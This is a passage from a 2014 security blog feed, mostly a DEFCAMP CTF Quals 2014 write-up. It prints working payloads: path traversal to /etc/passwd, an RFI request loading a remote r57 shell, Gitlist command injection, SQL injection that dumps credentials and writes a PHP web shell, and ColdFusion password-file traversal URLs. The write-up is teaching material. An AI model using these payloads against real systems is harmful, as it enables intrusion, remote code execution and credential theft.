&lt;p&gt;In the meantime, the attacker floods the victim server with forged responses that appear to originate from the delegated nameserver. The responses contain records that ultimately resolve the requested domain to IP addresses controlled by the attacker. They might contain answer records for the resolved name or, worse, they may further delegate authority to a nameserver owned by the attacker, so that s/he takes control of an entire zone.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If one of the forged responses matches the resolver's request (for example, by query name, type, ID and resolver source port) and is received before a response from the genuine nameserver, the resolver accepts the forged response and caches it, and discards the genuine response.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Future queries for the compromised domain or zone are answered with the forged DNS resolutions from the cache. If the attacker has specified a very long time-to-live on the forged response, the forged records stay in the cache for as long as possible without being refreshed.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h1&gt;References:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886"&gt;The Tangled Web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/security/"&gt;Django Security&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/security/"&gt;Bleach: Sanitizing Tool in Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/speed/public-dns/docs/security"&gt;Google's Public DNS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Marina von Steinkirch</dc:creator><pubDate>Fri, 31 Oct 2014 06:30:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-31:a-list-of-common-web-vulnerabilities.html</guid><category>XSS</category><category>CSRF</category><category>XSSI</category><category>Buffer_Overflow</category><category>LFI</category><category>RFI</category><category>iframe</category><category>SQLi</category></item><item><title>Exploring D-CTF Quals 2014's Exploits</title><link>http://bt3gl.github.io/exploring-d-ctf-quals-2014s-exploits.html</link><description>&lt;p&gt;Last weekend I played some of the &lt;a href="http://dctf.defcamp.ro/challs"&gt;DEFCAMP CTF Quals&lt;/a&gt;. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities  found in this CTF, some based on my team's game, some based on the &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/"&gt;CTF write-ups git repo&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Vulnerabilities&lt;/h2&gt;
&lt;h3&gt;Remote File Inclusion and Local File Inclusion Vulnerabilities&lt;/h3&gt;
&lt;p&gt;In &lt;a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion"&gt;Remote File Inclusion&lt;/a&gt; (RFI) an attacker can load exploits to the server. An attacker can use RFI to run exploits in both server and client sides. PHP's &lt;a href="http://php.net/manual/en/function.include.php"&gt;include()&lt;/a&gt; is extremely vulnerable to RFI attacks.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion"&gt;Local File Inclusion&lt;/a&gt; (LFI) is similar to RFI but only files that are currently in the server can be included.  This type of vulnerability is seem in forms for file uploading (with improper sanitation).&lt;/p&gt;
&lt;p&gt;An example of RFI exploitation is the case where the form only accepts some type of extensions (such as JPG or PNG) but the verification is made in the client side. In this case, an attacker can tamper the HTTP requests to send shell code (with PHP extension, for example). I've shown examples of this attack in the  &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas post&lt;/a&gt;. There  I've explained that the trick was to rename a PHP shell code to one of these safe extensions.&lt;/p&gt;
&lt;h3&gt;TimThumb and LFI&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://code.google.com/p/timthumb/"&gt;TimThumb&lt;/a&gt; is a PHP script for manipulating web images. It was recently &lt;a href="http://www.binarymoon.co.uk/2014/09/timthumb-end-life/"&gt;discontinued because of security issues&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;With TimThumb 1.33, an attacker is able to upload a shell by appending it to an image. All  she needs to do is to have it in some online subdomain. TimThumb will store this image in a cache folder and generate a MD5 of the full path of the shell. The last step is to perform a LFI attack with the shell in this folder. Check this &lt;a href="http://kaoticcreations.blogspot.com/2011/12/lfi-tip-how-to-read-source-code-using.html"&gt;example of LFI exploitation&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;CMS Mini and RFI&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.mini-print.com/"&gt;CMS Mini&lt;/a&gt; is file system to build simple websites. It has &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt; such as &lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)"&gt;CSRF&lt;/a&gt;, RFI, and &lt;a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"&gt;XSS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;An example of RFI vulnerability in CMS Mini is explored using curl:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://&lt;/span&gt;
&lt;span class="err"&gt;[target/IP]/cmsmini/admin/edit.php?path=&amp;amp;name=../../../../../etc/passwd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For more examples of exploits, check &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt; and &lt;a href="http://www.exploit-db.com/exploits/28128/"&gt;this exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;ApPHP and Remote Code Execution&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.apphp.com/"&gt;ApPHP&lt;/a&gt; is a blog script. It is known for having  &lt;a href="http://www.exploit-db.com/exploits/33030/"&gt;several vulnerabilities&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution"&gt;remote code execution&lt;/a&gt; (RCE). An example of RCE exploit for ApPHP &lt;a href="http://www.exploit-db.com/exploits/33070/"&gt;can be seen here&lt;/a&gt;. A good start is to check the PHP's &lt;a href="http://php.net/manual/en/ini.core.php#ini.disable-functions"&gt;disable_function&lt;/a&gt; list for stuff to hacker the server.&lt;/p&gt;
&lt;p&gt;In this CTF, the challenge was to find what was not in that list. For instance, it was possible to use &lt;a href="http://php.net/manual/en/reserved.variables.post.php"&gt;$_POST&lt;/a&gt; and &lt;a href="http://php.net/manual/en/reserved.variables.cookies.php"&gt;$_COOKIE&lt;/a&gt; to send strings to functions such as &lt;a href="http://php.net/manual/en/function.scandir.php"&gt;scandir()&lt;/a&gt; and &lt;a href="http://php.net/manual/en/function.file-get-contents.php"&gt;get_file_contents()&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/&lt;/span&gt;
&lt;span class="err"&gt;Cookie: 0=include&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
&lt;span class="err"&gt;Cookie: 0=http://www.r57shell.net/shell/r57.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Gitlist and Remote Command Execution&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://gitlist.org/"&gt;Gitlist&lt;/a&gt; is an application to browse github repositories in a browser. The  versions up to 5.0 are known for &lt;a href="http://www.websecuritywatch.com/arbitrary-command-execution-in-gitlist/"&gt;allowing remote attackers to execute arbitrary commands via shell&lt;/a&gt;, a type of &lt;a href="http://cwe.mitre.org/data/definitions/77.html"&gt;command injection&lt;/a&gt;. Exploits for this vulnerability can be seen at &lt;a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/"&gt;hatriot&lt;/a&gt;, at &lt;a href="http://packetstormsecurity.com/files/127364/Gitlist-Unauthenticated-Remote-Command-Execution.html"&gt;packet storm&lt;/a&gt;, at &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt;, and at &lt;a href="http://www.exploit-db.com/exploits/33990/"&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this CTF, the following command could be used to look for the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;LibreOffice's Socket Connections&lt;/h3&gt;
&lt;p&gt;LibreOffice's has a binary &lt;a href="http://www.processlibrary.com/en/directory/files/soffice/66728/"&gt;soffice.bin&lt;/a&gt; that takes socket connections on the &lt;em&gt;port 2002&lt;/em&gt; (in this CTF, in the VPN's localhost).&lt;/p&gt;
&lt;p&gt;For instance, the  command &lt;a href="http://linux.die.net/man/1/unoconv"&gt;unoconv&lt;/a&gt; can be used  to convert a file to a LibreOffice supported format. The flag &lt;strong&gt;-c&lt;/strong&gt; opens a connection by the client to connect to an LibreOffice instance. It also can be used by the listener to make LibreOffice listen.&lt;/p&gt;
&lt;p&gt;From the documentation, the default connection string is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Therefore, you can connect to the socket and convert some document (such as &lt;em&gt;/flag.txt&lt;/em&gt;) to a PDF for example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;An example of payload can be seen &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;ColdFusion and Local File Disclosure&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Adobe_ColdFusion"&gt;ColdFusion&lt;/a&gt; is an old web application development platform. It carries its own (interpreted) language, &lt;strong&gt;CFM&lt;/strong&gt;, with a Java backend.&lt;/p&gt;
&lt;p&gt;CFM has scripting features like ASP and PHP, and syntax resembling HTML and JavaScript.  ColdFusion scripts  have &lt;strong&gt;cfm&lt;/strong&gt; and &lt;strong&gt;cfc&lt;/strong&gt; file extension. For instance,  &lt;a href="http://www.adobe.com/products/coldfusion-family.html"&gt;Adobe ColdFusion 11&lt;/a&gt; and &lt;a href="http://www.getrailo.org/"&gt;Railio 4.2&lt;/a&gt;, the two platform accepting CFM,  were both released in the beginning of 2014.&lt;/p&gt;
&lt;p&gt;The problem is that CFM is &lt;a href="http://www.intelligentexploit.com/view-details.html?id=12750"&gt;vulnerable to a variety of attacks&lt;/a&gt;, including &lt;a href="https://www.owasp.org/index.php/Full_Path_Disclosure"&gt;Local File Disclosure&lt;/a&gt; (LFD) and SQL injection (SQLi). Adding this to the fact that ColdFusion scripts  usually run on elevated privileged users, we have a very vulnerable platform.&lt;/p&gt;
&lt;h4&gt;SQL Injection (SQLi)&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://www.owasp.org/index.php/SQL_Injection"&gt;SQL Injection&lt;/a&gt; is a classic attack where one injects exploits in a &lt;a href="http://technet.microsoft.com/en-us/library/bb264565(v=sql.90).aspx"&gt;SQL query&lt;/a&gt;. Vulnerabilities of this type can be spot in queries such as &lt;strong&gt;index.php?id=1&lt;/strong&gt;. I showed some of these exploits in my &lt;a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html"&gt;Natas post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this CTF, these were  some of the  exploits that could be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;List everything  in a database, where &lt;strong&gt;0x3a&lt;/strong&gt; is the hexadecimal symbol for &lt;strong&gt;:&lt;/strong&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;See the password file content:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Write files and create a PHP shell into &lt;strong&gt;URL/shell.php&lt;/strong&gt;, we can use a parameter &lt;strong&gt;x&lt;/strong&gt; to takes a parameter to be executed (based on &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;this&lt;/a&gt;):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php header(&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;utf-8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;); echo system($-GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;); ?&amp;gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notice the &lt;em&gt;trailing pair of hyphens&lt;/em&gt; &lt;strong&gt;--&lt;/strong&gt; which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed (it removes the trailing single-quote left over from the modified query). To learn more about how to mitigate SQLi, I recommend &lt;a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet"&gt;OWASP's SQLi Prevention Cheat Sheet&lt;/a&gt; and &lt;a href="http://owtf.github.io/boilerplate-templates/SQLinjection.html"&gt;this nice guide for SQLi mitigation&lt;/a&gt; by OWSAP OWTF.&lt;/p&gt;
&lt;p&gt;By the way, it's useful in general to know &lt;a href="http://www.w3schools.com/tags/ref_urlencode.asp"&gt;HTML URL Encoding&lt;/a&gt; to craft these URLs.&lt;/p&gt;
&lt;h3&gt;CesarFTP 0.99g and Buffer Overflow&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.softpedia.com/get/Internet/Servers/FTP-Servers/Cesar-FTP.shtml"&gt;CesarFTP 0.99g&lt;/a&gt; is an easy-to-use  FTP server. It is also known for having several vulnerabities, including &lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2961"&gt;buffer overflow&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For example, see this exploit for &lt;strong&gt;Metasploit&lt;/strong&gt; from &lt;a href="http://www.exploit-db.com/exploits/16713/"&gt;exploit-db&lt;/a&gt; (or &lt;a href="http://www.exploit-db.com/exploits/1906/"&gt;an older one here&lt;/a&gt;).&lt;/p&gt;
&lt;h4&gt;File Disclosure of Password Hashes&lt;/h4&gt;
&lt;p&gt;This vulnerability provides a 30 second window in the Administration panel, which can e use to write a shell code. The main idea is a &lt;a href="https://www.owasp.org/index.php/Path_Traversal"&gt;directory traversal&lt;/a&gt; to the &lt;strong&gt;password.proprieties&lt;/strong&gt; that can be used to login in the server.&lt;/p&gt;
&lt;p&gt;Ingredients of this attack are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The target must have ColdFusion administrator available, which is by default mapped to &lt;strong&gt;&lt;em&gt;CFIDE/administrator/enter.cfm&lt;/em&gt;&lt;/strong&gt;. If it gets &lt;a href="http://en.wikipedia.org/wiki/List_of_HTTP_status_codes"&gt;500&lt;/a&gt;, it should be switched to HTTPS.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;At the ColdFusion administrator, verify the version, and then use these injections:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;versions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Now a shell can be written to a file and added in &lt;strong&gt;Schedule New Task&lt;/strong&gt;. See detailed instructions at &lt;a href="http://www.blackhatlibrary.net/Coldfusion_hacking"&gt;blackhatlib&lt;/a&gt;, at &lt;a href="http://www.infointox.net/?p=59"&gt;infointox&lt;/a&gt;, at &lt;a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/"&gt;gnucitizen&lt;/a&gt;, at &lt;a href="http://kaoticcreations.blogspot.com/2012/11/hacking-cold-fusion-servers-part-i.html"&gt;kaoticcreations&lt;/a&gt;, at &lt;a href="https://www.cyberguerrilla.org/blog/?p=18275"&gt;cyberguerilla&lt;/a&gt;, at &lt;a href="http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html"&gt;jumpespjump&lt;/a&gt;, and at &lt;a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html"&gt;hexale&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Useful Tools&lt;/h2&gt;
&lt;h3&gt;Vulnerability Scanners&lt;/h3&gt;
&lt;p&gt;Vulnerability scanners can be useful for several problems. For instance, for a PHP static source code analyser, we can use &lt;a href="http://rips-scanner.sourceforge.net/"&gt;RIPS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this CTF we had to scan for &lt;a href="http://en.wikipedia.org/wiki/Heartbleed"&gt;Heartbleed&lt;/a&gt;, and we used &lt;a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/5c4306a11fadeba9d9f9385cdda689754ca4d362/heartbleed.py"&gt;this script&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Scapy&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://packetlife.net/blog/2011/may/23/introduction-scapy/"&gt;Scapy&lt;/a&gt; is a Python lib for crafting packets. It can be useful for problems such as &lt;a href="http://en.wikipedia.org/wiki/Port_knocking"&gt;port knocking&lt;/a&gt;. For illustration, check this &lt;a href="http://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/"&gt;example from PHD CTF 2011&lt;/a&gt; and this from &lt;a href="http://blog.dul.ac/2014/05/ASISCTF14/"&gt;ASIS CTF 2014&lt;/a&gt;. Check &lt;a href="https://code.google.com/p/pypk/source/browse/branches/release-0.1.0/knocker.py?r=3"&gt;this project&lt;/a&gt; too.&lt;/p&gt;
&lt;h3&gt;Steganography&lt;/h3&gt;
&lt;p&gt;One of the questions had a reference to the &lt;a href="https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/"&gt;paranoia.jar&lt;/a&gt; tool, which hides text in an image file using &lt;a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"&gt;128 bit AES&lt;/a&gt; encryption.&lt;/p&gt;
&lt;p&gt;To run the tool (after downloading it) just do:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;java -jar paranoia.jar
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;HTTP/HTTPS Request Tampering&lt;/h3&gt;
&lt;p&gt;Very useful for the RFI problems (but not limited to them):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/"&gt;Tamper Data&lt;/a&gt;: view and modify HTTP/HTTPS headers.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://portswigger.net/burp/"&gt;Burp&lt;/a&gt;: a Java application to secure or penetrate web applications.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Wireshark&lt;/h3&gt;
&lt;p&gt;At some point I'm going to dedicate an entire post for &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, but for this CTF the important things to know were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Look for POST requests:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Submit the found data (same username, nonce, and password) with the command:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;7413734&lt;/span&gt;&lt;span class="n"&gt;ab666ce02cf27c9862c96a8e7&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ecd6317a873b18e7dde351ac094ee3b&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="http://en.wikipedia.org/wiki/Exchangeable_image_file_format"&gt;Exif&lt;/a&gt; data extractor:&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.sno.phy.queensu.ca/~phil/exiftool/index.html"&gt;ExifTool&lt;/a&gt;  is used for reading, writing, and manipulating image metadata:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xf Image-ExifTool-9.74.tar.gz
&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;cd &lt;/span&gt;Image-ExifTool-9.74/
&lt;span class="nv"&gt;$ &lt;/span&gt;perl Makefile.PL
&lt;span class="nv"&gt;$ &lt;/span&gt;make &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo make install
&lt;span class="nv"&gt;$ &lt;/span&gt;exiftool IMAGEFILE
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;MD5 Lookups&lt;/h3&gt;
&lt;p&gt;Several hashes in this CTF needed to be searched. Google in general does a good job, but here are some specific websites: &lt;a href="http://hash-killer.com/"&gt;hash-killer&lt;/a&gt; and &lt;a href="http://www.md5this.com/"&gt;md5this&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;In the Shell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hexadecimal decoders&lt;/strong&gt; are essential. You can use Python's &lt;a href="https://docs.python.org/2/library/functions.html#hex"&gt;hex&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
/r/netsec
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or command line &lt;a href="http://linuxcommand.org/man_pages/xxd1.html"&gt;xxd&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yum install vim-common
&lt;span class="nv"&gt;$ &lt;/span&gt;xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
/r/netsec
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Base64 decoders&lt;/strong&gt; are also essential:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
